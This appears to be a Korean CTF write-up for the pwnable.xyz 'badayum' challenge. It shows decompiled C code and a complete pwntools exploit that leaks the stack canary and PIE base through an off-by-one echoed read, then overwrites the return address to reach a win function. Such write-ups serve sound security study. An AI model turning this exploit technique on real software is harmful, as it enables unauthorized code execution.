---
title: "[pwnable.xyz]badayum"
date: 2020-2-2
tags: [pwnable.xyz]
categories: [pwnable.xyz]
---

`sub_D48` 함수에서 랜덤 텍스트를 뿌려준다. 그리고 우리는 그 길이+1 만큼 입력 가능하다.

```c
unsigned __int64 sub_EAD()
{
  size_t v0; // rax
  size_t v2; // rax
  char *s1; // [rsp+8h] [rbp-78h]
  char s; // [rsp+10h] [rbp-70h]
  unsigned __int64 v5; // [rsp+78h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  while ( 1 )
  {
    s1 = sub_D48();
    memset(&s, 0, 0x64uLL);
    printf("Your score: %d\n", qword_202248);
    printf("me  > %s\n", s1);
    printf("you > ");
    v0 = strlen(s1);
    read(0, &s, v0 + 1);
    if ( !strncmp(&s, "exit", 4uLL) )
      break;
    v2 = strlen(s1);
    if ( !strncmp(s1, &s, v2) )
    {
      printf("You said: %s", &s);
      puts("Yay, you're good at this, let's go on :)\n");
      ++qword_202248;
    }
    else
    {
      printf("You said: %s", &s);
      puts("I don't think you understood how this game works :(\n");
      --qword_202248;
    }
    free(s1);
  }
  free(s1);
  puts("Ya go away, I don't want to play with you anymore anyways :P\n");
  return __readfsqword(0x28u) ^ v5;
}
```

랜덤 길이로 인풋 넣을 수 있는데 그리고 입력한거 출력해준다. 이로 인해 Canary, PIE leak 해준 후 win함수로 리턴해주면 된다.

> exploit.py

```python
from pwn import *
from ctypes import *

context.log_level = 'debug'
e = ELF('./challenge')
#p = process('./challenge')
p = remote('svc.pwnable.xyz',30027)
lib = CDLL('/lib/x86_64-linux-gnu/libc.so.6')
sa = lambda x,y : p.sendafter(x,y)
sla = lambda x,y : p.sendlineafter(x,y)

while True:
	p.recvuntil('me  > ')
	re = p.recvline().strip()
	log.info('me > {}'.format(re))
	if len(re) >= 105:
		sa('you > ','A'*104+'B')
		p.recvuntil('A'*104) 
		can = u64(p.recv(8)) - ord('B')
		log.info('Canary : {}'.format(hex(can)))
		break
	else:
		sa('you > ','B')

while True:
	p.recvuntil('me  > ')
	re = p.recvline().strip()
	log.info('me > {}'.format(re))
	if len(re) >= 121:
		sa('you > ','A'*120)
		p.recvuntil('A'*120)
		pie = u64(p.recv(6)+'\x00\x00') - 0x1081
		log.info('PIE : {}'.format(hex(pie)))
		break
	else:
		sa('you > ','C')

payload = 'A'*104 + p64(can) +'A'*8 + p64(pie + 0xd30) # win

while True:
	p.recvuntil('me  > ')
	re = p.recvline().strip()
	log.info('me > {}'.format(re))
	if len(re) >= len(payload):
		sa('you > ',payload)
		break
	else:
		sa('you > ','D')

sa('you > ','exit')
p.interactive()
```

